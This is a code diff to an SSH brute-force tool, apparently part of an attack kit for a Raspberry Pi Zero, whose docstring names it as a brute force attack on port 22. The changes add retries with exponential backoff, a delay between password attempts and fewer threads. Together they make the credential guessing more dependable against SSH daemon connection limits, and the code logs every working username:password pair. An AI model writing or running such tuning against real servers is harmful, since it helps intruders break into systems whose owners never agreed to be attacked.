@@ -3,6 +3,7 @@ ssh_connector.py - This script performs a brute force attack on SSH services (po
 """
 
 import os
+import time
 import pandas as pd
 import paramiko
 import socket
@@ -127,32 +128,39 @@ class SSHConnector:
         self.scan = self.scan[self.scan["Ports"].str.contains("22", na=False)]
 
     def ssh_connect(self, adresse_ip, user, password):
-        """Attempt to connect to SSH using only the supplied credentials."""
-        ssh = paramiko.SSHClient()
-        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-
-        try:
-            ssh.connect(
-                adresse_ip,
-                username=user,
-                password=password,
-                port=22,
-                timeout=15,
-                auth_timeout=15,
-                banner_timeout=15,
-                look_for_keys=False,  # Prevent consuming auth attempts with key probing
-                allow_agent=False
-            )
-            logger.debug(f"SSH login succeeded for {adresse_ip} using {user}:{password}")
-            return True
-        except paramiko.AuthenticationException:
-            logger.debug(f"SSH authentication failed for {adresse_ip} | user={user}")
-            return False
-        except (socket.error, paramiko.SSHException) as exc:
-            logger.warning(f"SSH connection error to {adresse_ip}: {exc}")
-            return False
-        finally:
-            ssh.close()
+        """Attempt to connect to SSH using only the supplied credentials.
+        Retries up to 3 times on banner/connection errors with backoff."""
+        max_retries = 3
+        for attempt in range(max_retries):
+            ssh = paramiko.SSHClient()
+            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            try:
+                ssh.connect(
+                    adresse_ip,
+                    username=user,
+                    password=password,
+                    port=22,
+                    timeout=15,
+                    auth_timeout=15,
+                    banner_timeout=15,
+                    look_for_keys=False,
+                    allow_agent=False
+                )
+                logger.debug(f"SSH login succeeded for {adresse_ip} using {user}:{password}")
+                return True
+            except paramiko.AuthenticationException:
+                logger.debug(f"SSH authentication failed for {adresse_ip} | user={user}")
+                return False
+            except (socket.error, paramiko.SSHException, EOFError) as exc:
+                if attempt < max_retries - 1:
+                    delay = 2 ** attempt  # 1s, 2s backoff
+                    logger.debug(f"SSH banner/connection error to {adresse_ip} (attempt {attempt+1}/{max_retries}), retrying in {delay}s: {exc}")
+                    time.sleep(delay)
+                else:
+                    logger.warning(f"SSH connection error to {adresse_ip} after {max_retries} attempts: {exc}")
+                    return False
+            finally:
+                ssh.close()
 
     def worker(self, progress, task_id, success_flag):
         """
@@ -185,6 +193,8 @@ class SSHConnector:
                         self._clear_queue()
             self.queue.task_done()
             progress.update(task_id, advance=1)
+            # Small delay between attempts to avoid overwhelming the SSH daemon
+            time.sleep(0.5)
 
 
     def run_bruteforce(self, adresse_ip, port):
@@ -217,7 +227,7 @@ class SSHConnector:
         with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%")) as progress:
             task_id = progress.add_task("[cyan]Bruteforcing SSH...", total=total_tasks)
             
-            for _ in range(6):  # Adjust the number of threads based on the RPi Zero's capabilities
+            for _ in range(2):  # Keep low to avoid overwhelming SSH daemons (MaxStartups)
                 t = threading.Thread(target=self.worker, args=(progress, task_id, success_flag))
                 t.start()
                 threads.append(t)
